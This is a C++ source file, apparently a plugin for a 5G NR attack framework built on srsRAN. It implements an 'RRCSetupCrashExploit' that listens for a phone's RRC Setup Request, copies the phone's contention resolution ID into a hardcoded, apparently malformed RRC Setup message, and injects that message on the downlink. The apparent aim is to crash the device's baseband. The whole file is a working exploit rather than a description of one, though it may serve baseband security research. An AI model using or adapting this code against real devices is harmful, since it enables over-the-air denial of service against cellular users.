#include "shadower/modules/exploit.h"
#include "shadower/utils/utils.h"
#include "srsran/asn1/asn1_utils.h"
#include "srsran/mac/mac_sch_pdu_nr.h"
#include <iomanip>
#include <sstream>
const uint8_t original_rrc_setup[] = {
    0x3e, 0x1a, 0x4,  0x26, 0xf1, 0x7d, 0xd0, 0x0,  0x9c, 0x28, 0x40, 0x4,  0x4,  0xba, 0xe0, 0x5,  0x80, 0x8,  0x8b,
    0xd7, 0x63, 0x80, 0x83, 0xf,  0x80, 0x3,  0xe0, 0x10, 0x23, 0x41, 0xe0, 0x40, 0x0,  0x20, 0x90, 0x4c, 0xc,  0xa8,
    0x9c, 0xf,  0xff, 0xf8, 0x0,  0x0,  0x0,  0x8,  0x0,  0x1,  0xb8, 0xa2, 0x10, 0x0,  0x4,  0x0,  0xb2, 0x80, 0x0,
    0x24, 0x10, 0x0,  0x2,  0x20, 0x49, 0xa0, 0x6a, 0xa4, 0x9a, 0x80, 0x0,  0x20, 0x4,  0x4,  0x0,  0x8,  0x0,  0xd0,
    0x10, 0x1,  0x3b, 0x64, 0xb1, 0x80, 0xee, 0x3,  0x91, 0xa2, 0xb3, 0xc4, 0x80, 0x0,  0x1,  0x4d, 0x8,  0x1,  0x0,
    0x1,  0x2c, 0xe,  0x10, 0x41, 0x64, 0xe0, 0xc1, 0xe,  0x0,  0x1c, 0x4a, 0x7,  0x0,  0x0,  0x8,  0x17, 0xbd, 0x0,
    0x40, 0x0,  0x40, 0x0,  0x1,  0x90, 0x0,  0x50, 0x0,  0xca, 0x81, 0x80, 0x62, 0x2a, 0xa,  0x80, 0x3,  0x80, 0x8,
    0x0,  0x8d, 0x10, 0x1,  0x51, 0x8,  0x1,  0x40, 0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x1,  0x14, 0x20,
    0x8,  0x1,  0x0,  0x2,  0x0,  0x0,  0x50, 0x2,  0x2,  0x0,  0xa,  0x98, 0x0};

class RRCSetupCrashExploit : public Exploit
{
public:
  RRCSetupCrashExploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                       SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    if (!prepare_rrc_setup()) {
      throw std::runtime_error("Failed to prepare RRC setup");
    }
    original_rrc_setup_len = sizeof(original_rrc_setup);
    rrc_setup_vec          = std::make_shared<std::vector<uint8_t> >(original_rrc_setup_len);
  }

  void setup() override
  {
    f_rrc_setup_request = ws_filter_t::make_filter("nr-rrc.c1 == 0");
    filters.push_back(f_rrc_setup_request);
  }

  void pre_dissection() override {}

  void post_dissection(uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (direction == UL && f_rrc_setup_request->match) {
      if (!extract_con_res_id(raw_buffer, raw_buffer_len, con_res_id, logger)) {
        logger.error("Failed to extract con_res_id from UL message");
        return;
      }
      logger.info(YELLOW "Received RRC setup request" RESET);
      srsran::byte_buffer_t tx_buffer;
      if (!replace_con_res_id(
              rrc_setup_mac_pdu, original_rrc_setup_len, con_res_id, tx_buffer, logger, &modified_dl_ccch_msg)) {
        logger.error("Failed to replace con_res_id in RRC setup request");
        return;
      }
      memcpy(rrc_setup_vec->data(), tx_buffer.data(), tx_buffer.size());
      dl_buffer_queue.push(rrc_setup_vec);
      return;
    }
  }

private:
  std::shared_ptr<ws_filter_t>               f_rrc_setup_request;
  uint32_t                                   original_rrc_setup_len;
  srsran::mac_sch_subpdu_nr::ue_con_res_id_t con_res_id;
  std::shared_ptr<std::vector<uint8_t> >     rrc_setup_vec;
  srsran::mac_sch_pdu_nr                     rrc_setup_mac_pdu;
  std::vector<uint8_t>                       modified_dl_ccch_msg;

  bool prepare_rrc_setup()
  {
    /* Unpack rrc_setup */
    if (rrc_setup_mac_pdu.unpack(original_rrc_setup, sizeof(original_rrc_setup)) != SRSRAN_SUCCESS) {
      printf("Failed to unpack MAC SDU\n");
      return false;
    }

    /* Enumerate all subpdus */
    uint32_t num_pdu = rrc_setup_mac_pdu.get_num_subpdus();
    for (uint32_t i = 0; i < num_pdu; i++) {
      srsran::mac_sch_subpdu_nr& subpdu = rrc_setup_mac_pdu.get_subpdu(i);
      if (subpdu.get_lcid() == srsran::mac_sch_subpdu_nr::nr_lcid_sch_t::CCCH) {
        /* Parse to dl ccch msg */
        modified_dl_ccch_msg.resize(subpdu.get_sdu_length());
        modified_dl_ccch_msg.assign(subpdu.get_sdu(), subpdu.get_sdu() + subpdu.get_sdu_length());
        return true;
      }
    }
    return false;
  }
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new RRCSetupCrashExploit(dl_buffer_queue_, ul_buffer_queue_);
}
}